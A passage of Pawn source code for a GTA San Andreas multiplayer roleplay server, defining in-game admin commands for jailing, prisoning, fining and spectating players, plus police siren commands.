							format(string, sizeof(string), "(Level %d Admin: No admin name set) - (Off-duty) - (ID %d - %s)", PlayerInfo[i][pAdmin], i, GetPlayerNameEx(i));
						}
					}
                }

                SendClientMessage(playerid, COLOR_WHITE, string);
            }
        }
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "If you have questions regarding gameplay, or the server use /newb.");
        SendClientMessage(playerid, COLOR_GRAD1, "If you see suspicious happenings/players /report [id] [reason].");
    }
    return 1;
}

CMD:jail(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new
			iTargetID,
			szReason[64];

		if(sscanf(params, "us[64]", iTargetID, szReason)) {
			SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /jail [playerid/partofname] [reason]");
		}
		else if(IsPlayerConnected(iTargetID)) {
			if(AdminDuty[iTargetID] == 1) {
				return SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on on-duty admins.");
			}
			if(PlayerInfo[iTargetID][pAdmin] >= PlayerInfo[playerid][pAdmin]) {
				return SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on equal or higher admins.");
			}

			//if(GetPVarInt(iTargetID, "PBM") > 0) LeavePaintballArena(iTargetID, GetPVarInt(iTargetID, "IsInArena"));

			new
				szMessage[128];

			ResetPlayerWeaponsEx(iTargetID);
			if(PlayerDraggedBy[iTargetID] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[iTargetID]] = INVALID_PLAYER_ID;
				PlayerDragged[iTargetID] = 0;
				PlayerDraggedBy[iTargetID] = INVALID_PLAYER_ID;
			}
			if(IsPlayerAttachedObjectSlotUsed(iTargetID, 0))
				RemovePlayerAttachedObject(iTargetID, 0);
			PlayerInfo[iTargetID][pJailed] = 3;
			PhoneOnline[iTargetID] = 1;
			PlayerInfo[iTargetID][pJailTime] = 20*60;

		    LoadObjectsForPlayer(iTargetID);

			SetPlayerInterior(iTargetID, 69);
			PlayerInfo[iTargetID][pVW] = 696969;
			PlayerInfo[iTargetID][pInt] = 69;
			SetPlayerVirtualWorld(iTargetID, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(iTargetID, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			format(szMessage, sizeof(szMessage), "AdmCmd: %s has been jailed by %s, reason: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, szMessage);

			format(szMessage, sizeof(szMessage), "AdmCmd: %s has been jailed by %s, reason: %s", GetPlayerNameEx(iTargetID), GetPlayerNameEx(playerid), szReason);
			Log("logs/admin.log", szMessage);

			format(szMessage, sizeof(szMessage), "You have been jailed by Admin %s for 20 minutes, reason: %s.", GetPlayerNameEx(playerid), szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			format(szMessage, sizeof(szMessage), "%s", szReason);
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			strcpy(PlayerInfo[iTargetID][pPrisonedBy], GetPlayerNameEx(playerid), MAX_PLAYER_NAME);
			strcpy(PlayerInfo[iTargetID][pPrisonReason], szReason, 128);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		}
	}
	return 1;
}

CMD:gotoplayerscar(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

        new
			iTargetID;

        if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotoplayerscar [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				szVehString[1024];

			for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
				if((iModelID = PlayerVehicleInfo[iTargetID][i][pvModelId] - 400) >= 0) {
					if(PlayerVehicleInfo[iTargetID][i][pvImpounded]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (impounded)", szVehString, VehicleName[iModelID]);
					}
					else if(PlayerVehicleInfo[iTargetID][i][pvDisabled]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (disabled)", szVehString, VehicleName[iModelID]);
					}
					else if(!PlayerVehicleInfo[iTargetID][i][pvSpawned]) {
						format(szVehString, sizeof(szVehString), "%s\n%s (stored)", szVehString, VehicleName[iModelID]);
					}
					else format(szVehString, sizeof(szVehString), "%s\n%s (ID %i)", szVehString, VehicleName[iModelID], PlayerVehicleInfo[iTargetID][i][pvId]);
				}
				else strcat(szVehString, "\nEmpty");
			}
		    ShowPlayerDialogEx(playerid, GOTOPLAYERCAR, DIALOG_STYLE_LIST, "Vehicle Teleportation", szVehString, "Teleport", "Cancel");
       		SetPVarInt(playerid, "playeraffectedcarTP", iTargetID);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		{

		}
  	}
	return 1;
}

CMD:watch(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not authorised to use this command.");
		return 1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while spectating.");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  	{
   		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

	if(isnull(params))
	{
	    // VIP gold room needs to be fixed
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /watch [location] (or /watch off)");
		SendClientMessage(playerid, COLOR_GRAD2, "General locations: gym, lspd, allsaints, countygen, grove, tgb, bank, motel, cityhall, mall");
        SendClientMessage(playerid, COLOR_GRAD2, "Point locations: mp1, df, mf1, dh, mp2, cl, mf2, aec, ffc");
	}
	// GENERAL LOCATIONS
	if(strcmp(params, "gym", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Ganton gym.");
		SetPlayerPos(playerid, 2212.61, -1730.57, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2208.67, -1733.71, 27.48);
		SetPlayerCameraLookAt(playerid, 2225.25, -1723.1, 13.56);
	}
	else if(strcmp(params, "lspd", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching the LSPD.");
		SetPlayerPos(playerid, 1504.23, -1700.17, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1500.21, -1691.75, 38.38);
		SetPlayerCameraLookAt(playerid, 1541.46, -1676.17, 13.55);
	}
	else if(strcmp(params, "allsaints", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching All Saints General Hospital.");
		SetPlayerPos(playerid, 1201.12, -1324, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1207.39, -1294.71, 24.61);
		SetPlayerCameraLookAt(playerid, 1181.72, -1322.65, 13.58);
	}
	else if(strcmp(params, "countygen", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching County General Hospital.");
		SetPlayerPos(playerid, 1989.24, -1461.38, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1981.79, -1461.55, 31.93);
		SetPlayerCameraLookAt(playerid, 2021.23, -1427.48, 13.97);
	}
	else if(strcmp(params, "grove", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Grove Street.");
		SetPlayerPos(playerid, 2489.09, -1669.88, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2459.82, -1652.68, 26.45);
		SetPlayerCameraLookAt(playerid, 2489.09, -1669.88, 13.34);
	}
	else if(strcmp(params, "tgb", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Ten Green Bottles.");
		SetPlayerPos(playerid, 2319.09, -1650.90, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2336.31, -1664.76, 24.98);
		SetPlayerCameraLookAt(playerid, 2319.09, -1650.90, 14.16);
	}
	else if(strcmp(params, "bank", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching the Los Santos bank.");
		SetPlayerPos(playerid, 1466.24, -1023.05, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1502.28, -1044.47, 31.19);
		SetPlayerCameraLookAt(playerid, 1466.24, -1023.05, 23.83);
	}
	else if(strcmp(params, "motel", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Jefferson motel.");
		SetPlayerPos(playerid, 2215.73, -1163.39, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2203.05, -1152.81, 37.03);
		SetPlayerCameraLookAt(playerid, 2215.73, -1163.39, 25.73);
	}
	else if(strcmp(params, "cityhall", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Los Santos City Hall.");
		SetPlayerPos(playerid, 1478.936035, -1746.446655, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1447.461669, -1717.788085, 44.047473);
		SetPlayerCameraLookAt(playerid, 1478.936035, -1746.446655, 14.347633);
	}
	else if(strcmp(params, "mall", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Los Santos Mall.");
		SetPlayerPos(playerid, 1127.245483, -1451.613891, -80.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1092.614868, -1499.197998, 42.018226);
		SetPlayerCameraLookAt(playerid, 1127.245483, -1451.613891, 15.796875);
	}

	// Points (mp1, df, mf1, dh, mp2, cl, mf2, aec, ffc)
	else if(strcmp(params, "mp1", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Materials Pickup 1.");
  		SetPlayerPos(playerid, 1423.773437, -1320.386962, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 1411.689941, -1352.002929, 24.477527);
		SetPlayerCameraLookAt(playerid, 1423.773437, -1320.386962, 13.554687);
	}
	else if(strcmp(params, "df", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Drug Factory.");
  		SetPlayerPos(playerid, 2205.938964, 1582.210449, 987.316528);
		SetPlayerInterior(playerid, 1);
		PlayerInfo[playerid][pInt] = 1;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2222.844482, 1590.667968, 1002.612915);
		SetPlayerCameraLookAt(playerid, 2206.402587, 1582.398681, 999.976562);
	}
	else if(strcmp(params, "mf1", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Materials Factory 1.");
  		SetPlayerPos(playerid, 2172.315185, -2263.781250, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2206.363769, -2262.568359, 24.240808);
		SetPlayerCameraLookAt(playerid, 2172.315185, -2263.781250, 13.335824);
	}
	else if(strcmp(params, "dh", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching the Drug House.");
  		SetPlayerPos(playerid, 323.577026, 1118.344116, 1063.765625);
		SetPlayerInterior(playerid, 5);
		PlayerInfo[playerid][pInt] = 5;
		SetPlayerVirtualWorld(playerid, 20019);
		PlayerInfo[playerid][pVW] = 20019;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 316.387817, 1123.946289, 1085.046020);
		SetPlayerCameraLookAt(playerid, 323.577026, 1118.344116, 1083.882812);
	}
	else if(strcmp(params, "mp2", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Materials Pickup 2.");
  		SetPlayerPos(playerid, 2390.212402, -2008.328491, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2410.285644, -2013.919433, 21.716161);
		SetPlayerCameraLookAt(playerid, 2390.212402, -2008.328491, 13.553703);
	}
	else if(strcmp(params, "cl", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Crack Lab.");
  		SetPlayerPos(playerid, 2346.013916, -1185.367065, 977.425842);
		SetPlayerInterior(playerid, 5);
		PlayerInfo[playerid][pInt] = 5;
		SetPlayerVirtualWorld(playerid, 20020);
		PlayerInfo[playerid][pVW] = 20020;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2342.012207, -1180.969848, 1029.412353);
		SetPlayerCameraLookAt(playerid, 2346.013916, -1185.367065, 1027.976562);
	}
	else if(strcmp(params, "mf2", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Materials Factory 2.");
  		SetPlayerPos(playerid, 2282.298828, -1110.143798, -35.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2306.088623, -1133.968627, 52.929584);
		SetPlayerCameraLookAt(playerid, 2282.298828, -1110.143798, 37.976562);
	}
	else if(strcmp(params, "aec", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching the Auto Export Company.");
  		SetPlayerPos(playerid,2729.929687, -2451.353271, -60.0);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2780.443847, -2383.833984, 31.127187);
		SetPlayerCameraLookAt(playerid, 2729.929687, -2451.353271, 17.593746);
	}
	else if(strcmp(params, "ffc", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're now watching Fossil Fuel Company.");
  		SetPlayerPos(playerid, 2662.808105, -2133.713623, -39.590702);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		TogglePlayerControllable(playerid,0);
		SetPlayerCameraPos(playerid, 2662.808105, -2133.713623, 26.140636);
		SetPlayerCameraLookAt(playerid, 2636.352294, -2109.808349, 13.546875);
	}


	// OFF
	else if(strcmp(params, "off", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're no longer watching any area.");
		SetPlayerPos(playerid, 1520.50, -1674.70, 13.55);
		SetPlayerInterior(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pVW] = 0;
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		TogglePlayerControllable(playerid,1);
	}
	return 1;
}

CMD:prisoners(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
 	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		{
   			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}

  		new
  		    string[128];

		SendClientMessage(playerid, COLOR_WHITE, "----------------------------------------");

		foreach(Player, i) {
    		if(PlayerInfo[i][pJailed] >= 1 && PlayerInfo[i][pJailTime] >= 1) {
        		if(strlen(PlayerInfo[i][pPrisonReason]) >= 1 && strlen(PlayerInfo[i][pPrisonedBy]) >= 1) {
					format(string, sizeof(string), "%s (by: %s), reason: %s (%d minutes)", GetPlayerNameEx(i), PlayerInfo[i][pPrisonedBy], PlayerInfo[i][pPrisonReason], PlayerInfo[i][pJailTime]/60);
	                SendClientMessage(playerid, COLOR_GREY, string);
      			}
         		else
           		{
            		format(string, sizeof(string), "%s (by: unknown), reason: unknown (%d minutes)", GetPlayerNameEx(i), PlayerInfo[i][pJailTime]/60);
             		SendClientMessage(playerid, COLOR_GREY, string);
             	}
      		}
      	}

      	SendClientMessage(playerid, COLOR_WHITE, "----------------------------------------");
	}
	return 1;
}

CMD:prison(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			giveplayerid,
			minutes,
			reason[64];

		if(sscanf(params, "uds[64]", giveplayerid, minutes, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /prison [playerid/partofname] [minutes] [reason]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
				return SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on an equal or higher level admin that is on-duty.");

			SetPlayerArmedWeapon(giveplayerid, 0);

			GameTextForPlayer(giveplayerid, "~w~Welcome to ~n~~r~Admin Prison", 5000, 3);

			ResetPlayerWeaponsEx(giveplayerid);
			format(string, sizeof(string), "AdmCmd: %s has been prisoned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdmCmd: %s has been prisoned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			punishmentLog(giveplayerid, playerid, 2, string, reason);
			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailed] = 3;
			PlayerInfo[giveplayerid][pJailTime] = minutes*60;

			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);

			format(PlayerInfo[giveplayerid][pPrisonReason], 128, "%s", reason);
			format(PlayerInfo[giveplayerid][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
			PhoneOnline[giveplayerid] = 1;

		    LoadObjectsForPlayer(giveplayerid);

			SetPlayerInterior(giveplayerid, 69);
			PlayerInfo[giveplayerid][pVW] = 696969;
			PlayerInfo[giveplayerid][pInt] = 69;
			SetPlayerVirtualWorld(giveplayerid, 696969);
			new rand = random(sizeof(AdminPrisonFloat));
			SetPlayerPos(giveplayerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);

			SetPlayerSkin(giveplayerid, 50);
			SetPlayerColor(giveplayerid, TEAM_APRISON_COLOR);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:oprison(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
   			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			name[MAX_PLAYER_NAME],
			minutes,
			reason[64];

		if(sscanf(params, "s[24]ds[64]", name, minutes, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /oprison [playername] [time (minutes)] [reason]");

        new giveplayerid = ReturnUser(name);
        if(IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GRAD2, "That player is online, use /prison for online players.");

		SetPVarInt(playerid, "oprisontime", minutes*60);
		SetPVarString(playerid, "oprisonreason", reason);

		new
		    szPlayerName[MAX_PLAYER_NAME];

		mysql_escape_string(name,szPlayerName,MAX_PLAYER_NAME,sqldb);

		mysql_format(sqldb,string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, JailTime, ID FROM players WHERE Username = '%s'", szPlayerName);
		mysql_tquery(sqldb,string,"OnQueryFinished","ii",THREAD_OFFLINE_PRISON,playerid);
	}
	return 1;
}

CMD:fine(playerid, params[])
{
	new string[128], giveplayerid, amount, reason[64];
	if(sscanf(params, "uds", giveplayerid, amount, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fine [playerid/partofname] [amount] [reason]");

	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(IsPlayerConnected(giveplayerid))
		{
			if(amount < 1)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Amount must be greater than 0");
				return 1;
			}
			format(string, sizeof(string), "AdmCmd: %s was fined $%d by %s, reason: %s", GetPlayerNameEx(giveplayerid), amount, GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			punishmentLog(giveplayerid, playerid, 3, string, reason);

			format(string, sizeof(string), "AdmCmd: %s was fined $%d by %s, reason: %s", GetPlayerNameEx(giveplayerid), amount, GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			GivePlayerCash(giveplayerid, -amount);
			return 1;
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not a level three admin.");
	}
	return 1;
}

CMD:pfine(playerid, params[])
{
	new string[128], giveplayerid, percentage, reason[64];
	if(sscanf(params, "uds[64]", giveplayerid, percentage, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /pfine [playerid/partofname] [percentage] [reason]");

	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		if(IsPlayerConnected(giveplayerid))
		{
			new fine, allmoney;

			if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse]][hOwner], true) == 0)
			{
				allmoney = HouseInfo[PlayerInfo[giveplayerid][pHouse]][hSafeMoney]+GetPlayerCash(giveplayerid)+PlayerInfo[giveplayerid][pBank];
			}
			else if(PlayerInfo[giveplayerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse2]][hOwner], true) == 0)
			{
				allmoney += HouseInfo[PlayerInfo[giveplayerid][pHouse2]][hSafeMoney];
			}
			else
			{
				allmoney = GetPlayerCash(giveplayerid)+PlayerInfo[giveplayerid][pBank];
			}
			if(allmoney < 1)
			{
				SendClientMessage(giveplayerid, COLOR_GRAD2, "That player does not have any money!");
				return 1;
			}

			fine = percentage*allmoney/100;
			if(percentage < 1 || percentage > 100)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Amount must be greater than 0 and below 100.");
				return 1;
			}
			format(string, sizeof(string), "AdmCmd: %s was fined $%d by %s, reason: %s", GetPlayerNameEx(giveplayerid), fine, GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdmCmd: %s was fined $%d by %s, reason: %s", GetPlayerNameEx(giveplayerid), fine, GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);
			punishmentLog(giveplayerid, playerid, 3, string, reason);
			GivePlayerCash(giveplayerid, -fine);
			return 1;
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not a level three admin.");
	}
	return 1;
}

CMD:takeadminweapons(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /takeadminweapons [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			for(new s = 0; s < 12; s++)
			{
				if(PlayerInfo[giveplayerid][pAGuns][s] != 0)
				{
					RemovePlayerWeapon(giveplayerid, PlayerInfo[giveplayerid][pAGuns][s]);
				}
			}
			format(string,sizeof(string),"You have removed %s's admin spawned weapons.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:deletead(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
		    iTarget;

		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /deletead [playerid/partofname]");

		if(iTarget == INVALID_PLAYER_ID)
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(!isnull(szAdvert[iTarget])) {
		    strdel(szAdvert[iTarget], 0, strlen(szAdvert[iTarget]));
		    szAdvert[iTarget][0] = 0; // never can remember if it actually sets it to the null terminator

		    new
		        szMessage[64];

			format(szMessage, sizeof(szMessage), "You have removed %s's ad from the ad system.", GetPlayerNameEx(iTarget));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s has removed your ad from the ad system.", GetPlayerNameEx(playerid));
			SendClientMessage(iTarget, COLOR_WHITE, szMessage);
		} else return SendClientMessage(playerid, COLOR_GREY, "This ad either doesn't exist or was a priority ad.");
	}
	return 1;
}

CMD:sirenoff(playerid, params[]) {
	if(IsACop(playerid)) {
	    if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
	        DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
	        DeletePVar(playerid, "SirenO");
	        SendClientMessage(playerid, COLOR_WHITE, "The siren has been removed from your vehicle.");
	    } else SendClientMessage(playerid, COLOR_GREY, "You have not applied a siren to your vehicle.");
	} else SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	return 1;
}

CMD:destroysirens(playerid, params[]) {
	if(IsACop(playerid) && PlayerInfo[playerid][pRank] > 4) {
		new
			szMessage[128];
		foreach(Player, i) {
			if(IsValidDynamicObject(GetPVarInt(i, "SirenO")) && GetPVarInt(i, "SirenO") > 0) {
				DestroyDynamicObject(GetPVarInt(i, "SirenO"));
				DeletePVar(i, "SirenO");
			}
		}
